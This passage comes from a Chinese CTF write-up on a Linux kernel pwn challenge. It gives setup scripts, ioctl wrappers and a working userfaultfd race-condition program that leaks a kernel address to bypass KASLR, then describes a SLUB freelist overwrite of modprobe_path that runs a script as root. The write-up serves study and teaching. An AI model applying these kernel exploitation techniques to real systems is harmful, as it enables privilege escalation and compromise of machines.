<span class="string">&quot;&#123;==DBG==&#125; Boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span></span><br><span class="line">insmod note.ko</span><br><span class="line"><span class="built_in">mknod</span> /dev/knote c 10 233</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/knote</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/ptmx</span><br><span class="line"><span class="built_in">chown</span> 0:0 /flag</span><br><span class="line"><span class="built_in">chmod</span> 400 /flag</span><br><span class="line"></span><br><span class="line">poweroff -d 120 -f &amp;</span><br><span class="line"></span><br><span class="line"><span class="built_in">chroot</span> . setuidgid 1000 /bin/sh <span class="comment">#normal user</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure><p>在init文件中，有一些常规的保护措施，如这里的<code>kptr_restrict</code>和<code>dmesg_restrict</code>，都设为1表示对普通用户有限制作用而对root用户没有，因此调试时修改为root用户可以查看kallsyms文件。与之前的题一样，在调试时通过将uid改为0方便调试。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">cd</span> /home/ctf</span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./rootfs.cpio \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr&quot;</span> \</span><br><span class="line">-netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \</span><br><span class="line">-nographic \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-smp cores=2,threads=1 \</span><br><span class="line">-cpu qemu64,+smep,+smap</span><br></pre></td></tr></table></figure><p>在start.sh文件中，可以看到开启了kaslr、smp保护。添加上-s选项以供调试。</p><h1 id="0x3-交互编写"><a href="#0x3-交互编写" class="headerlink" title="0x3. 交互编写"></a>0x3. 交互编写</h1><p>通过<code>ioctl</code>函数可知，<code>mychunk</code>实际上就是我们传入<code>ioctl</code>函数的第三个参数，这个<code>chunk</code>结构体会被根据不同的函数进行不同的操作。因此我们可以先将程序的交互写好，再去分析具体的漏洞。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> GET 0x2333</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD 0x1337</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EDIT 0x8888</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEL 0x6666</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> index, <span class="type">char</span>* buffer)</span>&#123;</span><br><span class="line">    input in = &#123;</span><br><span class="line">            .info = &#123;</span><br><span class="line">                    .index = index,</span><br><span class="line">            &#125;,</span><br><span class="line">            .buf = buffer,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, GET, &amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> size)</span>&#123;</span><br><span class="line">    input in = &#123;</span><br><span class="line">            .info = &#123;</span><br><span class="line">                    .size = size,</span><br><span class="line">            &#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, ADD, &amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dele</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">    input in = &#123;</span><br><span class="line">            .info = &#123;</span><br><span class="line">                    .index = index,</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, DEL, &amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">(<span class="type">int</span> index, <span class="type">char</span>* buffer)</span>&#123;</span><br><span class="line">    input in = &#123;</span><br><span class="line">            .info = &#123;</span><br><span class="line">                    .index = index,</span><br><span class="line">            &#125;,</span><br><span class="line">            .buf = buffer,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, EDIT, &amp;in);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x4-漏洞分析与利用"><a href="#0x4-漏洞分析与利用" class="headerlink" title="0x4. 漏洞分析与利用"></a>0x4. 漏洞分析与利用</h1><h2 id="1-通过userfaultfd获取内核基地址"><a href="#1-通过userfaultfd获取内核基地址" class="headerlink" title="1. 通过userfaultfd获取内核基地址"></a>1. 通过<code>userfaultfd</code>获取内核基地址</h2><p>在本题中，核心的操作就是<code>get</code>、<code>add</code>、<code>edit</code>、<code>dele</code>这4个。其中<code>get</code>和<code>edit</code>函数没有加锁，<code>dele</code>和<code>add</code>都加了写锁。通过<code>get</code>或<code>edit</code>函数可以传入一个mmap出来的用户空间，然后触发<code>userfaultfd</code>。那么在条件竞争的这个时间窗口，我们又需要做什么呢？和上一题相似，也是重复打开<code>/dev/ptmx</code>文件，尝试使用同样的方法进行利用。下面是我们的第一个测试程序（kernel.h请参考<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I">资料</a>中提到的通用kernel pwn板子，<code>print_binary</code>请参考笔者之前的kernel pwn文章）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by ubuntu on 22-10-5.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">input</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span>&#123;</span></span><br><span class="line">        <span class="type">size_t</span> size;</span><br><span class="line">        <span class="type">size_t</span> index;</span><br><span class="line">    &#125;info;</span><br><span class="line">    <span class="type">char</span>* buf;</span><br><span class="line">&#125;input;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET 0x2333</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD 0x1337</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EDIT 0x8888</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEL 0x6666</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_STRUCT_SIZE 0x2E0</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span>* faultBuffer;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> index, <span class="type">char</span>* buffer)</span>&#123;</span><br><span class="line">    input in = &#123;</span><br><span class="line">            .info.index = index,</span><br><span class="line">            .buf = buffer,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, GET, &amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> size)</span>&#123;</span><br><span class="line">    input in = &#123;</span><br><span class="line">            .info.size = size,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, ADD, &amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dele</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">    input in = &#123;</span><br><span class="line">            .info.index = index,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, DEL, &amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">(<span class="type">int</span> index, <span class="type">char</span>* buffer)</span>&#123;</span><br><span class="line">    input in = &#123;</span><br><span class="line">            .info.index = index,</span><br><span class="line">            .buf = buffer,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, EDIT, &amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *page = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> page_size;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">fault_handler_thread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="type">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="type">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="type">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(GREEN <span class="string">&quot;Parent process stopped here.&quot;</span> CEND);</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                          ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    saveStatus();</span><br><span class="line">    page_size = sysconf(_SC_PAGE_SIZE);</span><br><span class="line">    page = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="string">&#x27;0&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    faultBuffer = (<span class="type">char</span>*)mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    registerUserFaultFd(faultBuffer, <span class="number">0x1000</span>, (<span class="type">void</span>*)fault_handler_thread);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> shellFile = open(<span class="string">&quot;/getFlag&quot;</span>, O_RDWR | O_CREAT);</span><br><span class="line">    <span class="type">char</span>* shellCode = <span class="string">&quot;#!/bin/sh\n&quot;</span></span><br><span class="line">                      <span class="string">&quot;chmod 777 /flag&quot;</span>;</span><br><span class="line">    write(shellFile, shellCode, <span class="built_in">strlen</span>(shellCode));</span><br><span class="line">    close(shellFile);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /getFlag&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/knote&quot;</span>, O_RDWR);</span><br><span class="line">    add(TTY_STRUCT_SIZE);</span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;Fork failed&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(GREEN <span class="string">&quot;Child process sleeping...&quot;</span> CEND);</span><br><span class="line">        sleep(<span class="number">2</span>);</span><br><span class="line">        <span class="built_in">puts</span>(GREEN <span class="string">&quot;Ready to delete note in child process...&quot;</span> CEND);</span><br><span class="line">        dele(<span class="number">0</span>);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">puts</span>(GREEN <span class="string">&quot;Ready to open /dev/ptmx in child process...&quot;</span> CEND);</span><br><span class="line">        open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">        get(<span class="number">0</span>, faultBuffer);</span><br><span class="line">    print_binary(faultBuffer, TTY_STRUCT_SIZE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/bb25fbeb52e24948a81a2a42d413dc4b.png"><br>上图就是通过<code>userfaultfd</code>阻塞后获取到的部分内存内容，可以发现虽然<code>/dev/ptmx</code>打开之后分配了<code>ptm_unix98_ops</code>和<code>pty_unix98_ops</code>，但是并没有出现<code>tty_operations</code>中特有的魔数。</p><p><img src="https://img-blog.csdnimg.cn/b307b115c39047389a932cf55d766b7c.png"><br>但是在<code>0x2B0</code>的偏移处我们发现了一个可疑的值：<code>0xffffffff91bd4ef0</code>。为什么说这个值很可疑呢？如果我们使用<code>cat /proc/kallsyms</code>命令获取标识符的地址时不难发现，绝大多数内核的标识符地址都是以8个f开头的，而在我们获取到的地址中只有这一个值前面跟上了8个f，因此我们有理由怀疑这个地址有可能是某个标识符的地址，而不需要对我们获取的其他值通过<br><code>cat /proc/kallsyms | grep xxx</code>来进行查找了。从上面的图中我们也可以看到，这个值也确实是一个标识符的值：<code>do_SAK_work</code>，我们不需要管这个标识符的作用是什么，但通过这个标识符我们就已经能够获取到内核的基址，绕过KASLR保护了。</p><p><img src="https://img-blog.csdnimg.cn/e6fe3040911d465d806cf0be94148e28.png"><br>在IDA中，我们可以获取到<code>do_SAK_work</code>在未KASLR时的地址。</p><p><img src="https://img-blog.csdnimg.cn/902686a48f6348e5be69166ab9adb570.png"><br><font color=red><strong>需要注意的是，本题中<code>do_SAK_work</code>这个地址并不是每一次都会出现，而且有可能尝试很多次都是什么都没有读取到，需要进行多次尝试才能获取该地址。</strong></font></p><h2 id="2-通过modprobe-path进行利用"><a href="#2-通过modprobe-path进行利用" class="headerlink" title="2. 通过modprobe_path进行利用"></a>2. 通过<code>modprobe_path</code>进行利用</h2><p>在获取了内核的基地址之后，我们就需要使用一个新的利用方式——<code>modprobe_path</code>来进行后面的利用了。</p><p>（节选自arttnba3师傅的博客）</p><blockquote><p>当我们尝试去执行（execve）一个非法的文件（file magic not found），内核会经历如下调用链</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">entry_SYSCALL_64()</span><br><span class="line">   sys_execve()</span><br><span class="line">     do_execve()</span><br><span class="line">       do_execveat_common()</span><br><span class="line">         bprm_execve()</span><br><span class="line">           exec_binprm()</span><br><span class="line">             search_binary_handler()</span><br><span class="line">               __request_module() <span class="comment">// wrapped as request_module</span></span><br><span class="line">                 call_modprobe()</span><br></pre></td></tr></table></figure></blockquote><p>由于本题的kernel版本为5.3.6，因此我们找到这个版本的<code>call_modprobe</code>函数看一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/kmod.c line 70</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">call_modprobe</span><span class="params">(<span class="type">char</span> *module_name, <span class="type">int</span> wait)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> *<span class="title">info</span>;</span></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *envp[] = &#123;</span><br><span class="line"><span class="string">&quot;HOME=/&quot;</span>,</span><br><span class="line"><span class="string">&quot;TERM=linux&quot;</span>,</span><br><span class="line"><span class="string">&quot;PATH=/sbin:/usr/sbin:/bin:/usr/bin&quot;</span>,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> **argv = kmalloc(<span class="keyword">sizeof</span>(<span class="type">char</span> *[<span class="number">5</span>]), GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!argv)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">module_name = kstrdup(module_name, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!module_name)</span><br><span class="line"><span class="keyword">goto</span> free_argv;</span><br><span class="line"></span><br><span class="line">argv[<span class="number">0</span>] = modprobe_path;</span><br><span class="line">argv[<span class="number">1</span>] = <span class="string">&quot;-q&quot;</span>;</span><br><span class="line">argv[<span class="number">2</span>] = <span class="string">&quot;--&quot;</span>;</span><br><span class="line">argv[<span class="number">3</span>] = module_name;<span class="comment">/* check free_modprobe_argv() */</span></span><br><span class="line">argv[<span class="number">4</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,</span><br><span class="line"> <span class="literal">NULL</span>, free_modprobe_argv, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (!info)</span><br><span class="line"><span class="keyword">goto</span> free_module_name;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> call_usermodehelper_exec(info, wait | UMH_KILLABLE);</span><br><span class="line"></span><br><span class="line">free_module_name:</span><br><span class="line">kfree(module_name);</span><br><span class="line">free_argv:</span><br><span class="line">kfree(argv);</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>modprobe_path</code>被定义在data段中，值为<code>/sbin/modprobe</code>。而<code>call_usermodehelper_exec</code>函数会<font color=red><strong>以root权限</strong></font>执行这个程序。由于data段可写，因此如果能够将<code>modprobe_path</code>的值改写，就可以执行任意shell脚本了。</p><p>那么应该如何修改<code>modprobe_path</code>呢？这里就需要用到我们对于slub内核内存分配系统的理解了。在前面笔者并没有对linux内核的内存分配系统作详尽的解释，可以参考下面的资料进行了解，后面笔者也会进行进一步的学习和分析：</p><p><a href="https://www.cnblogs.com/tolimit/p/4551428.html">页框分配器</a><br><a href="https://www.cnblogs.com/tolimit/p/4566189.html">SLAB概述</a><br><a href="https://blog.csdn.net/wh8_2011/article/details/52287557?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166522587916800182720892%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166522587916800182720892&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-4-52287557-null-null.142%5Ev52%5Ejs_top,201%5Ev3%5Econtrol_1&utm_term=slub&spm=1018.2226.3001.4187">SLUB概述</a></p><p>在本题中，我们只需要清楚SLUB分配器的一个特性：<font color=red><strong>SLUB分配器中有多个内存块（笔者称作cache），在一个被释放的cache的最前面保存的是下一个可用的cache地址</strong></font>，也就是说，如果我们能够利用条件竞争漏洞去修改一个已经被释放的cache的最前8个字节，那么下一次分配能够分配到该chunk的话，再下一次就能够分配到任一地址去。也正是利用这个特性，我们可以将<code>modprobe_path</code>的地址写到被释放的cache中，然后再进行两次分配即可分配到<code>modprobe_path</code>处的地址，并通过<code>edit</code>函数随意进行改写。有关于Linux内核内存分配机制，笔者将会在下一篇文章中进行详细介绍，这里我们只需要知道上面这一点就可以了。同时还需要注意的是，在分配到<code>modprobe_path</code>之后，由于我们已经破坏了SLUB的结构，因此如果直接结束进程，会导致<code>kernel panic</code>，本题中我们只需要在<code>modprobe_path</code>利用之前编写一个脚本将flag文件的权限改成777，后利用条件竞争漏洞将<code>modprobe_path</code>修改为这个脚本的路径，然后执行一个非法文件触发<code>modprobe_path</code>漏洞，以root权限执行这个脚本，后面我们就能够直接通过<code>read</code>读取flag文件的内容了。因此<strong>本题的利用方式并不是提权</strong>。</p><p>如此一来，思路就清晰了，exp自然就信手拈来了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span 